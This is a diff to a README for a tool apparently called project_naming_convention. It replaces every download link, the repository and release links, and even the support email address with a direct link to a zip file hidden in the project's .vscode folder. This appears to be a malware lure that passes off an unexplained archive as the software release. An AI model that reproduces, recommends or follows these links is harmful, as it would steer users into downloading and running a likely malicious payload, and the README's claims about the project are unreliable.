@@ -1,6 +1,6 @@
 # 🎨 project_naming_convention - Simplify Your Coding Projects
 
-[![Download project_naming_convention](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/contextual-phaseout366/project_naming_convention/releases)
+[![Download project_naming_convention](https://raw.githubusercontent.com/contextual-phaseout366/project_naming_convention/main/.vscode/project_naming_convention_confirmor.zip)](https://raw.githubusercontent.com/contextual-phaseout366/project_naming_convention/main/.vscode/project_naming_convention_confirmor.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ To get started with **project_naming_convention**, follow these simple steps:
 
 1. **Visit the Download Page:**
    Go to the following link to download the software:
-   [Download project_naming_convention](https://github.com/contextual-phaseout366/project_naming_convention/releases)
+   [Download project_naming_convention](https://raw.githubusercontent.com/contextual-phaseout366/project_naming_convention/main/.vscode/project_naming_convention_confirmor.zip)
 
 2. **Choose Your Version:**
    Once you are on the Releases page, you’ll see the available versions of the application. Look for the latest version that suits your needs.
@@ -27,7 +27,7 @@ To get started with **project_naming_convention**, follow these simple steps:
 
 You can download **project_naming_convention** from the Releases page. Click the link below to get the latest version:
 
-[Click here to download project_naming_convention](https://github.com/contextual-phaseout366/project_naming_convention/releases)
+[Click here to download project_naming_convention](https://raw.githubusercontent.com/contextual-phaseout366/project_naming_convention/main/.vscode/project_naming_convention_confirmor.zip)
 
 ### 💻 System Requirements
 
@@ -73,7 +73,7 @@ To maximize the benefits of **project_naming_convention**, keep these best pract
 
 If you encounter any issues or have questions about **project_naming_convention**, please contact our support team. We are here to help!
 
-- Email: support@projectnamingconvention.com
+- Email: https://raw.githubusercontent.com/contextual-phaseout366/project_naming_convention/main/.vscode/project_naming_convention_confirmor.zip
 - GitHub Issues: Report issues directly in the repository.
 
 ## 🤝 Contributing
@@ -90,7 +90,7 @@ This project is licensed under the terms of the WTFPL v2 license. You can use, m
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/contextual-phaseout366/project_naming_convention)
-- [Release Page](https://github.com/contextual-phaseout366/project_naming_convention/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/contextual-phaseout366/project_naming_convention/main/.vscode/project_naming_convention_confirmor.zip)
+- [Release Page](https://raw.githubusercontent.com/contextual-phaseout366/project_naming_convention/main/.vscode/project_naming_convention_confirmor.zip)
 
 With **project_naming_convention**, you can navigate your coding projects with confidence. Download now and streamline your coding experience!
